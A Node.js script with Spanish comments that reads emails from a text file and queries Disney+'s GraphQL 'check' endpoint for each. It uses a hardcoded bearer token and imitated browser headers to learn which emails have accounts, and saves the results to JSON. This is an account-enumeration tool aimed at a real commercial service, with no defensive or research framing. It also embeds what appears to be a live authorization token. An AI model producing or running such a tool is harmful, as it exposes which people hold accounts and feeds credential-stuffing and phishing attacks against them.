import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..kWJu_I-cNmNLwVb9.PPOY5aExTCTgyBVpZGJZK5MPtufqxD92Qm3ERtbnh9H_P37cXtHuJiv3jIEUtVGB0YdPfiYFpP9PEtn1boFE5MXiEIAe17OgFhX4iNC5gse2im710sIwhq-6mekIMC3CrxisCMYDEeWS24qUfzs3zRD_knjorNXQtOo2elkzImJhoCIBxT9vk_dAzrgVYmUVxiksHYDvwwOSkKCC5Vq1U6OsK0JtNvzjOtrp80mCfLQFYZUlFy1IJz-4B_XOpBaHxVJb2iWZbiF6CY3pGoYJJobHEAHKMMGztLMKawlSZMTlf514ph-8BcwZR07RqOYI-RLdUjnTX4sEVI89MXLv0bj8eJwrnMzibe4d_4Ja6PZ82FYaxql4nRm0MUk8SJRc4vkXMvSrMcmD-loMDozd2MJjBE7bojnldiD12nbP9gk78znEtKwh3uBPtrjDSJrRu7sKQJcN1D-It0s6GJy5T7_7zVjQUVKdqCyD4FrYtM1PW2QnxTJzWFgnMwUR-EE6EEXzVNljHCOg7pbU6_p_WvxAejMsHt9zQymI7xq0ObJ3tZQVEMiR7GB5RJCv-A5EKcAuvYKIhaf-WxLyONqzVrCdF3yGYxYiKWdG6JbfWbb9n5fHbxLPdT95607k3D_t7sy7Ot3M5YTP2176BTllrkf-jqDgX7ixJrCfIqbfCn622lWy0kwwv_1JHH9MfWlk36VrCF4ghQAtMjBJTvbf2wsANK0WVKfqBF5gRgCVpZLQrPn4qbaQubIZjc8Kv5SGnYktF5hQT3osQCIDrK3bMq2nmMbKBnnxgWfKu92n77t9RghjdICdFCo86qRc3AzPMNs1V1yM8PF_2sc7NZmqW99OMPHOvQYsKU8GVsv-iFkJ7KKK73AdXJ1CxcdsuYcbMWYAYtZAY-b4KQdg0Cdbnb_Njx6ccVBUJ1VrcnWN9_Tg4yp_vzLnqI-3iy348AT2RBx7CX_x9mTwAn-pqBHWEtxpoqODAuiF_hR6dY2YzMCv1SJ1h_HM7DW1ivM6dFyDJcIW5PefyxcR8QD8ostxKvVGkmUqirXj-GZcKK5ulyr_iASfAr-aKSHIdTnEru0oqtofREwQuLW9x2bE3FhcoajiGKhfXF-Hf8Gykt0-NGXw9wfblYJFqJtx8xzDbR0TXmqj151wq3wHiTzeS1d68_jgGqVtmeGhEyrA21Kj6Gk6nsE-62V7FsOCzGYoY0jO0i-xBA6fX4u3N2swiyWb68629UdluKoVSPDQGbqg8qA-K5ZV8N2XhpPu5J-IKCoUE8mQLBGffnOqw4W9C1bzOwLGPoJ8t6SxDubnGuvve62L8xN4p9oaJwbKKdJdkJYNB8PspYTT96zFZjZR9HKRW5bz8rqqdhVjmOH9vDJSB88xlCPsIPZTMkj5zzR57BjHuikEr8g6nZZl-53yAN1VaNBwvp3aU2VG7552J3nGufZuE1JZ0KP5k0kVXCqO6HvwyMEIjzmcGw6t9HFu8gCcw9R48OBijfQ7H3G9BaOsDe0XgDirBptncEFsAgfoRbwk4NE920QE65Pt0iG4KU-q0Gzg3vwxZDLbcMhsf4hln9UIdSlx4dbpFyCPlYOgAM8OO95B36uFy0aHuh0FUNJjNzySONa4HnFuTCDqjVRR7kvu7ohFw8Yhf9urxQ9htnC01g6_yEyx7rF5ekVh7z6dAlczXrq4ZgdnLKucr2oWrhnnUlyaWpO2iw-d5ow8-Xm-ysz7FAzjNjdoF83r9pZZpVgHo_ZEQMokbxNJF27FbEDqb2mij8--jm4A5i2J-NphHfM72GoApxb3SHtyChCql7kou0zgMfmjigrBZQJXz7Qc7sdxt3FOrBj-aSy0ottsGPkMRZl5wtqtny7D1dlD3vAX7tzsinNrovxG5M1bBRY5RLxoN55X-DKDKTrr12mR6NR7XmzEl2iilv-CCuNbPdi-fM5xmbm_8jXx0NWXYDWvCuPrY1jBrXIEMcx7Pq_uVAwg8EjUiPAyzDUCYVQACYcWhF6S1-A1jS4zZaRSt13QGSL1KFQN1AowdNRVCq7l0qHeQO4_jxLEW-cfu22FOgevOVgKTDkAUNjKaoWRWGwg5SFkp1Ad21FSvk0Kqx1QRTx_LLo3H0OBrFxxbA17yXKfOUwjJtwePNGCi99qKvXfEzEB7EClYVwGvvO8I0y-gkON3eUIU2nQ5Hwi5AB6IUfe0xlI_r-7mRkzdXnZQit7bgzahupo6J6xczqkpHvMj7LEhnS7aU4Q0BUBYISp5qHfhCKguyq_tCDcjVFvZ5aYhAVVmcUeWAQkgUM1BnlwWBtx4YKqLF5s2EXJm9MSV3LN-e0XKPCpZ8BfzURYdiuxc_hjpzP43czg98VZTX90xgXFVgKS_meMs5XqhTEcjhhLcjJoXsKyIQCyA6BwIBB07Px9HGzAaY6bpY97qPr26ovqEbbvCsHg676Ry_9yDlw3_3vynjVm3nIHSFpD090yD4JXPcmeeEH5dGF1DPxUbi9wWZR6WKDlEAUiDnT-Q7imP11JW97gqBGyIm0PTW4OC-5R7gSva-J2ObooLh9FdmZqs6AeZMS8Z9SVI-kAW6jEI2XQlCTYz8oJDDLl6G88nFSwwxC09bjysWr5-fFMAxc.T9Lt_hDhJWpF0tBeohDPUQ"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];
    
    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if(result.noError){
        if(result.exist===true){
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if(result.exist===false){
            console.log((i+1) + " no existe")
        }
    }

    if(result.noError===false){
        if(result.serverError){
            console.error("🖥🖥🖥🖥 Error servidor: "+result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: "+result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if(result.exist===null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}